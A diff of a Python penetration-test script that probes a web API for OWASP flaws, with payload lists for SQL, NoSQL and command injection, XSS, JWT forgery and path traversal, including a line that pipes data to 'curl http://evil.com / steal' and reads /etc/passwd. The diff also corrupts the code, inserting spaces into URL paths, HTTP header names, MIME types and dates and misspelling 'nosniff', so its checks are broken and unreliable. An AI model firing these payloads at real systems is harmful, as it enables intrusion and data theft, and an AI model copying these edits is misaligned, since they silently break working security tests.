@@ -4,15 +4,11 @@ Tests for OWASP Top 10 vulnerabilities and security best practices
 """
 
 import asyncio
-import base64
-import hashlib
 import json
 import random
-import re
-import string
 import time
-from datetime import datetime, timedelta
-from typing import Any, Dict, List
+from datetime import datetime
+from typing import Any, Dict
 from urllib.parse import quote
 
 import httpx
@@ -34,7 +30,7 @@ class SecurityPenetrationTest:
         async with httpx.AsyncClient() as client:
             # Create test user
             await client.post(
-                f"{self.base_url}/api/v1/auth/register",
+                f"{self.base_url}/api / v1 / auth / register",
                 json={
                     "email": self.test_user["username"],
                     "password": self.test_user["password"],
@@ -44,7 +40,7 @@ class SecurityPenetrationTest:
 
             # Login to get valid token
             response = await client.post(
-                f"{self.base_url}/api/v1/auth/login", json=self.test_user
+                f"{self.base_url}/api / v1 / auth / login", json=self.test_user
             )
             if response.status_code == 200:
                 self.valid_token = response.json()["access_token"]
@@ -112,7 +108,7 @@ class SecurityPenetrationTest:
                 ],
             ),
             (
-                "Cross-Site Scripting (XSS)",
+                "Cross - Site Scripting (XSS)",
                 [
                     self.test_reflected_xss,
                     self.test_stored_xss,
@@ -177,14 +173,14 @@ class SecurityPenetrationTest:
             "admin'--",
             "' OR 1=1--",
             "'; EXEC xp_cmdshell('dir'); --",
-            "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM users),1,1)) > 64--",
+            "' AND ASCII(SUBSTRING((SELECT TOP 1 name FROM users), 1, 1)) > 64--",
         ]
 
         async with httpx.AsyncClient() as client:
             # Test login endpoint
             for payload in sql_payloads:
                 response = await client.post(
-                    f"{self.base_url}/api/v1/auth/login",
+                    f"{self.base_url}/api / v1 / auth / login",
                     json={"username": payload, "password": payload},
                 )
 
@@ -202,9 +198,9 @@ class SecurityPenetrationTest:
             # Test search endpoints
             headers = {"Authorization": f"Bearer {self.valid_token}"}
             search_endpoints = [
-                "/api/v1/customers/search",
-                "/api/v1/orders/search",
-                "/api/v1/products/search",
+                "/api / v1 / customers / search",
+                "/api / v1 / orders / search",
+                "/api / v1 / products / search",
             ]
 
             for endpoint in search_endpoints:
@@ -240,7 +236,7 @@ class SecurityPenetrationTest:
             for payload in nosql_payloads:
                 try:
                     response = await client.post(
-                        f"{self.base_url}/api/v1/auth/login",
+                        f"{self.base_url}/api / v1 / auth / login",
                         json=(
                             payload
                             if isinstance(payload, dict)
@@ -253,7 +249,7 @@ class SecurityPenetrationTest:
                         result["vulnerabilities"].append(
                             f"NoSQL injection with: {payload}"
                         )
-                except:
+                except Exception:
                     pass
 
         return result
@@ -270,10 +266,10 @@ class SecurityPenetrationTest:
             "; ls -la",
             "| whoami",
             "`id`",
-            "$(cat /etc/passwd)",
+            "$(cat /etc / passwd)",
             "; ping -c 10 127.0.0.1",
             "& dir",
-            "; curl http://evil.com/steal",
+            "; curl http://evil.com / steal",
         ]
 
         async with httpx.AsyncClient() as client:
@@ -282,11 +278,11 @@ class SecurityPenetrationTest:
             # Test file upload endpoints
             for payload in cmd_payloads:
                 files = {
-                    "file": (f"test{payload}.jpg", b"fake image data", "image/jpeg")
+                    "file": (f"test{payload}.jpg", b"fake image data", "image / jpeg")
                 }
 
                 response = await client.post(
-                    f"{self.base_url}/api/v1/upload", files=files, headers=headers
+                    f"{self.base_url}/api / v1 / upload", files=files, headers=headers
                 )
 
                 if response.status_code == 200:
@@ -305,7 +301,7 @@ class SecurityPenetrationTest:
 
             for params in export_params:
                 response = await client.get(
-                    f"{self.base_url}/api/v1/reports/export",
+                    f"{self.base_url}/api / v1 / reports / export",
                     params=params,
                     headers=headers,
                 )
@@ -346,9 +342,9 @@ class SecurityPenetrationTest:
         async with httpx.AsyncClient() as client:
             for password in weak_passwords:
                 response = await client.post(
-                    f"{self.base_url}/api/v1/auth/register",
+                    f"{self.base_url}/api / v1 / auth / register",
                     json={
-                        "email": f"weak_test_{random.randint(1000,9999)}@test.com",
+                        "email": f"weak_test_{random.randint(1000, 9999)}@test.com",
                         "password": password,
                         "full_name": "Weak Password Test",
                     },
@@ -371,9 +367,9 @@ class SecurityPenetrationTest:
 
         for password, issue in test_passwords:
             response = await client.post(
-                f"{self.base_url}/api/v1/auth/register",
+                f"{self.base_url}/api / v1 / auth / register",
                 json={
-                    "email": f"policy_test_{random.randint(1000,9999)}@test.com",
+                    "email": f"policy_test_{random.randint(1000, 9999)}@test.com",
                     "password": password,
                     "full_name": "Policy Test",
                 },
@@ -398,7 +394,7 @@ class SecurityPenetrationTest:
             failed_attempts = 0
             for i in range(20):
                 response = await client.post(
-                    f"{self.base_url}/api/v1/auth/login",
+                    f"{self.base_url}/api / v1 / auth / login",
                     json={
                         "username": "admin@luckygas.com",
                         "password": f"wrong_password_{i}",
@@ -420,7 +416,7 @@ class SecurityPenetrationTest:
             if failed_attempts >= 5:
                 # Try correct password
                 response = await client.post(
-                    f"{self.base_url}/api/v1/auth/login",
+                    f"{self.base_url}/api / v1 / auth / login",
                     json={
                         "username": "admin@luckygas.com",
                         "password": "correct_password",
@@ -455,7 +451,7 @@ class SecurityPenetrationTest:
                 # Try none algorithm
                 none_token = jwt.encode(decoded, "", algorithm="none")
                 response = await client.get(
-                    f"{self.base_url}/api/v1/users/me",
+                    f"{self.base_url}/api / v1 / users / me",
                     headers={"Authorization": f"Bearer {none_token}"},
                 )
 
@@ -464,12 +460,12 @@ class SecurityPenetrationTest:
                     result["vulnerabilities"].append("Accepts 'none' algorithm")
 
                 # Try weak secret
-                weak_secrets = ["secret", "123456", "password", "jwt-secret"]
+                weak_secrets = ["secret", "123456", "password", "jwt - secret"]
                 for secret in weak_secrets:
                     try:
                         weak_token = jwt.encode(decoded, secret, algorithm="HS256")
                         response = await client.get(
-                            f"{self.base_url}/api/v1/users/me",
+                            f"{self.base_url}/api / v1 / users / me",
                             headers={"Authorization": f"Bearer {weak_token}"},
                         )
 
@@ -479,7 +475,7 @@ class SecurityPenetrationTest:
                                 f"Weak JWT secret: {secret}"
                             )
                             break
-                    except:
+                    except Exception:
                         pass
 
                 # Test token expiration
@@ -490,7 +486,7 @@ class SecurityPenetrationTest:
                 )
 
                 response = await client.get(
-                    f"{self.base_url}/api/v1/users/me",
+                    f"{self.base_url}/api / v1 / users / me",
                     headers={"Authorization": f"Bearer {expired_token}"},
                 )
 
@@ -498,7 +494,7 @@ class SecurityPenetrationTest:
                     result["status"] = "VULNERABLE"
                     result["vulnerabilities"].append("Accepts expired tokens")
 
-            except Exception as e:
+            except Exception:
                 pass
 
         return result
@@ -516,11 +512,11 @@ class SecurityPenetrationTest:
 
             # Create a test object
             response = await client.post(
-                f"{self.base_url}/api/v1/orders",
+                f"{self.base_url}/api / v1 / orders",
                 json={
                     "customer_id": 1,
                     "products": [{"product_id": 1, "quantity": 1}],
-                    "delivery_date": "2024-01-20",
+                    "delivery_date": "2024 - 01 - 20",
                 },
                 headers=headers,
             )
@@ -533,7 +529,8 @@ class SecurityPenetrationTest:
                     other_id = my_order_id + offset
                     if other_id > 0 and other_id != my_order_id:
                         response = await client.get(
-                            f"{self.base_url}/api/v1/orders/{other_id}", headers=headers
+                            f"{self.base_url}/api / v1 / orders/{other_id}",
+                            headers=headers,
                         )
 
                         if response.status_code == 200:
@@ -552,7 +549,7 @@ class SecurityPenetrationTest:
                         for i in range(1, 5):
                             next_uuid = uuid.UUID(int=base_uuid.int + i)
                             response = await client.get(
-                                f"{self.base_url}/api/v1/orders/{str(next_uuid)}",
+                                f"{self.base_url}/api / v1 / orders/{str(next_uuid)}",
                                 headers=headers,
                             )
 
@@ -562,7 +559,7 @@ class SecurityPenetrationTest:
                                     "Predictable UUID generation"
                                 )
                                 break
-                    except:
+                    except Exception:
                         pass
 
         return result
@@ -586,17 +583,17 @@ class SecurityPenetrationTest:
         async with httpx.AsyncClient() as client:
             for origin in malicious_origins:
                 response = await client.options(
-                    f"{self.base_url}/api/v1/users/me",
+                    f"{self.base_url}/api / v1 / users / me",
                     headers={
                         "Origin": origin,
-                        "Access-Control-Request-Method": "GET",
-                        "Access-Control-Request-Headers": "Authorization",
+                        "Access - Control - Request - Method": "GET",
+                        "Access - Control - Request - Headers": "Authorization",
                     },
                 )
 
-                allow_origin = response.headers.get("Access-Control-Allow-Origin")
+                allow_origin = response.headers.get("Access - Control - Allow - Origin")
                 allow_credentials = response.headers.get(
-                    "Access-Control-Allow-Credentials"
+                    "Access - Control - Allow - Credentials"
                 )
 
                 if allow_origin == origin or allow_origin == "*":
@@ -618,12 +615,12 @@ class SecurityPenetrationTest:
         result = {"test": "Security Headers", "status": "SECURE", "vulnerabilities": []}
 
         required_headers = {
-            "X-Content-Type-Options": "nosniff",
-            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
-            "X-XSS-Protection": "1; mode=block",
-            "Strict-Transport-Security": "max-age=",
-            "Content-Security-Policy": ["default-src", "script-src"],
-            "Referrer-Policy": ["no-referrer", "strict-origin"],
+            "X - Content - Type - Options": "nosnif",
+            "X - Frame - Options": ["DENY", "SAMEORIGIN"],
+            "X - XSS - Protection": "1; mode=block",
+            "Strict - Transport - Security": "max - age=",
+            "Content - Security - Policy": ["default - src", "script - src"],
+            "Referrer - Policy": ["no - referrer", "strict - origin"],
         }
 
         async with httpx.AsyncClient() as client:
@@ -660,14 +657,14 @@ class SecurityPenetrationTest:
         result = {"test": "Reflected XSS", "status": "SECURE", "vulnerabilities": []}
 
         xss_payloads = [
-            "<script>alert('XSS')</script>",
+            "<script > alert('XSS')</script>",
             "<img src=x onerror=alert('XSS')>",
             "<svg onload=alert('XSS')>",
             "javascript:alert('XSS')",
             "<iframe src=javascript:alert('XSS')>",
-            "'><script>alert('XSS')</script>",
-            '"><script>alert("XSS")</script>',
-            "<script>alert(String.fromCharCode(88,83,83))</script>",
+            "'><script > alert('XSS')</script>",
+            '"><script > alert("XSS")</script>',
+            "<script > alert(String.fromCharCode(88, 83, 83))</script>",
             "<img src=x onerror=\"javascript:alert('XSS')\">",
             "<body onload=alert('XSS')>",
         ]
@@ -675,9 +672,9 @@ class SecurityPenetrationTest:
         async with httpx.AsyncClient() as client:
             # Test search endpoints
             search_endpoints = [
-                "/api/v1/customers/search",
-                "/api/v1/orders/search",
-                "/api/v1/products/search",
+                "/api / v1 / customers / search",
+                "/api / v1 / orders / search",
+                "/api / v1 / products / search",
                 "/search",
             ]
 
@@ -689,8 +686,8 @@ class SecurityPenetrationTest:
                     )
 
                     if payload in response.text and response.headers.get(
-                        "Content-Type", ""
-                    ).startswith("text/html"):
+                        "Content - Type", ""
+                    ).startswith("text / html"):
                         result["status"] = "VULNERABLE"
                         result["vulnerabilities"].append(f"Reflected XSS in {endpoint}")
                         break
@@ -702,7 +699,7 @@ class SecurityPenetrationTest:
         result = {"test": "Stored XSS", "status": "SECURE", "vulnerabilities": []}
 
         xss_payloads = [
-            "<script>alert('Stored XSS')</script>",
+            "<script > alert('Stored XSS')</script>",
             "<img src=x onerror=alert('Stored XSS')>",
             "<svg onload=alert('Stored XSS')>",
         ]
@@ -714,7 +711,7 @@ class SecurityPenetrationTest:
             for i, payload in enumerate(xss_payloads):
                 # Create customer with XSS payload
                 response = await client.post(
-                    f"{self.base_url}/api/v1/customers",
+                    f"{self.base_url}/api / v1 / customers",
                     json={
                         "code": f"XSS{i}",
                         "name": payload,
@@ -730,7 +727,7 @@ class SecurityPenetrationTest:
 
                     # Retrieve and check if payload is properly escaped
                     response = await client.get(
-                        f"{self.base_url}/api/v1/customers/{customer_id}",
+                        f"{self.base_url}/api / v1 / customers/{customer_id}",
                         headers=headers,
                     )
 
@@ -766,28 +763,33 @@ class SecurityPenetrationTest:
                 # Failed login attempts
                 (
                     "POST",
-                    "/api/v1/auth/login",
+                    "/api / v1 / auth / login",
                     {"username": "admin", "password": "wrong"},
                     "Failed login",
                 ),
                 # SQL injection attempt
                 (
                     "GET",
-                    "/api/v1/customers/search?q=' OR '1'='1",
+                    "/api / v1 / customers / search?q=' OR '1'='1",
                     None,
                     "SQL injection attempt",
                 ),
                 # Path traversal
-                ("GET", "/api/v1/files/../../../../etc/passwd", None, "Path traversal"),
+                (
+                    "GET",
+                    "/api / v1 / files/../../../../etc / passwd",
+                    None,
+                    "Path traversal",
+                ),
                 # XSS attempt
                 (
                     "POST",
-                    "/api/v1/customers",
-                    {"name": "<script>alert('XSS')</script>", "phone": "0912345678"},
+                    "/api / v1 / customers",
+                    {"name": "<script > alert('XSS')</script>", "phone": "0912345678"},
                     "XSS attempt",
                 ),
                 # Unauthorized access
-                ("GET", "/api/v1/admin/users", None, "Unauthorized access"),
+                ("GET", "/api / v1 / admin / users", None, "Unauthorized access"),
             ]
 
             # Execute suspicious activities
@@ -804,7 +806,8 @@ class SecurityPenetrationTest:
 
             # Try to access security logs
             response = await client.get(
-                f"{self.base_url}/api/v1/admin/security-logs", headers=admin_headers
+                f"{self.base_url}/api / v1 / admin / security - logs",
+                headers=admin_headers,
             )
 
             if response.status_code == 404:
@@ -843,11 +846,11 @@ class SecurityPenetrationTest:
         async with httpx.AsyncClient() as client:
             # Check common endpoints that might expose version info
             version_endpoints = [
-                "/api/version",
-                "/api/v1/version",
+                "/api / version",
+                "/api / v1 / version",
                 "/version",
-                "/.well-known/dependencies",
-                "/api/health",
+                "/.well - known / dependencies",
+                "/api / health",
             ]
 
             for endpoint in version_endpoints:
@@ -874,7 +877,7 @@ class SecurityPenetrationTest:
                                         result["vulnerabilities"].append(
                                             f"{lib} {version} has known vulnerabilities"
                                         )
-                    except:
+                    except Exception:
                         pass
 
         return result
@@ -897,7 +900,7 @@ class SecurityPenetrationTest:
                 "passed": total_passed,
                 "failed": total_tests - total_passed,
                 "total_vulnerabilities": total_vulnerabilities,
-                "security_score": f"{(total_passed/total_tests)*100:.1f}%",
+                "security_score": f"{(total_passed / total_tests)*100:.1f}%",
             },
             "owasp_coverage": {},
             "critical_vulnerabilities": [],
@@ -985,7 +988,7 @@ class SecurityPenetrationTest:
             "SQL Injection": "Implement parameterized queries and input validation",
             "Weak Password Policy": "Enforce strong password requirements (min 12 chars, complexity)",
             "JWT Vulnerabilities": "Use strong secrets, validate algorithms, implement proper expiration",
-            "Security Headers": "Implement all security headers including CSP, HSTS, X-Frame-Options",
+            "Security Headers": "Implement all security headers including CSP, HSTS, X - Frame - Options",
             "Security Event Logging": "Implement comprehensive security event logging and monitoring",
         }
 
@@ -1013,15 +1016,15 @@ async def main():
     report = await tester.run_all_tests()
 
     # Save report
-    with open("security-penetration-report.json", "w") as f:
+    with open("security - penetration - report.json", "w") as f:
         json.dump(report, f, indent=2)
 
-    print(f"\nSecurity Penetration Test Summary:")
+    print("\nSecurity Penetration Test Summary:")
     print(f"Total Tests: {report['summary']['total_tests']}")
     print(f"Passed: {report['summary']['passed']}")
     print(f"Failed: {report['summary']['failed']}")
     print(f"Security Score: {report['summary']['security_score']}")
-    print(f"\nVulnerabilities Found:")
+    print("\nVulnerabilities Found:")
     print(f"Critical: {len(report['critical_vulnerabilities'])}")
     print(f"High: {len(report['high_vulnerabilities'])}")
     print(f"Medium: {len(report['medium_vulnerabilities'])}")
